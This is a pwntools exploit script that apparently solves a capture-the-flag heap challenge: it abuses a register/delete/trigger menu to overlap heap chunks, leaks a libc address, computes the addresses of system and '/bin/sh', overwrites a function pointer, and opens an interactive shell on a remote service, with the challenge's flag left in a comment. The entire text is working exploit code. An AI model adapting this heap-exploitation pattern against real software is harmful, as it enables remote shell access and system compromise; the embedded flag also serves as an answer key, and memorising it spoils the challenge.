from pwn import *

r = process('./chal')
r = remote('10.113.184.121',10059)
def register(idx,name_len,name):
    r.sendafter(b'choice: ',str(1).encode())
    r.sendafter(b'Index: ',str(idx).encode())
    r.sendafter(b'Nmae Length: ',str(name_len).encode())
    r.sendafter(b'Name: ',name)

def delete(idx):
    r.sendafter(b'choice: ',str(2).encode())
    r.sendafter(b'Index: ',str(idx).encode())



def trigger(idx):
    r.sendafter(b'choice: ',str(3).encode())
    r.sendafter(b'Index: ',str(idx).encode())

register(0,0x420,b'ccccc')
register(1,0x50,b'ccccc')

delete(1)
delete(0)
register(0,0x38,b'c')
trigger(0)

r.recvuntil(b'Name: ')
libc = u64(r.recv(6)+b'\x00\x00') - 0x1ecf63
print(hex(libc))

system = libc + 0x52290
bin_sh = libc + 0x1b45bd
delete(0)
register(0,0x18,p64(bin_sh) + p64(bin_sh) + p64(system)) 
trigger(1)# flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}
r.interactive()